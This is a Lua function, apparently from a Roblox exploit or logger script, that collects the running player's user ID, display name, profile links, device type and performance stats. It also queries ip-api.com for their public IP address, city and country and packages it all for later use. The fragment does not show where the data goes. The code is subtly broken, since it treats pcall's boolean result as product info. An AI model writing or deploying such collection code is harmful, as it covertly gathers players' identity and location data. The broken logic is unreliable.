-- Collect game and player information
local function collectGameInfo()
    local placeId = game.PlaceId
    
    local productInfo = pcall(function()
        return marketplaceService:GetProductInfo(placeId, Enum.InfoType.Asset)
    end)
    
    local gameName = productInfo and productInfo.Name or "Unknown"
    local creatorName = productInfo and productInfo.Creator.Name or "Unknown"
    local gameLink = "https://www.roblox.com/games/" .. placeId
    local gameThumbnail = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. placeId .. "&width=768&height=432&format=png"
    
    local userId = localPlayer.UserId
    local displayName = localPlayer.DisplayName
    local avatarHeadshot = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
    local profileLink = "https://www.roblox.com/users/" .. userId .. "/profile"
    
    local ipInfo = "Unknown"
    local city = "Unknown"
    local country = "Unknown"
    
    pcall(function()
        local data = httpService:JSONDecode(game:HttpGet("http://ip-api.com/json/"))
        ipInfo = data.query or "Unknown"
        city = data.city or "Unknown"
        country = data.country or "Unknown"
    end)
    
    local ping = math.floor(stats.Network.ServerStatsItem["Data Ping"]:GetValue())
    local fps = math.floor(1 / runService.RenderStepped:Wait())
    
    local deviceType = "PC"
    if userInputService.TouchEnabled and not userInputService.KeyboardEnabled then
        deviceType = "Mobile"
    elseif userInputService.GamepadEnabled and not userInputService.KeyboardEnabled then
        deviceType = "Console"
    end
    
    return {
        gameName = gameName,
        creatorName = creatorName,
        gameLink = gameLink,
        gameThumbnail = gameThumbnail,
        userId = userId,
        displayName = displayName,
        avatarHeadshot = avatarHeadshot,
        profileLink = profileLink,
        ip = ipInfo,
        city = city,
        country = country,
        ping = ping,
        fps = fps,
        deviceType = deviceType
    }
end

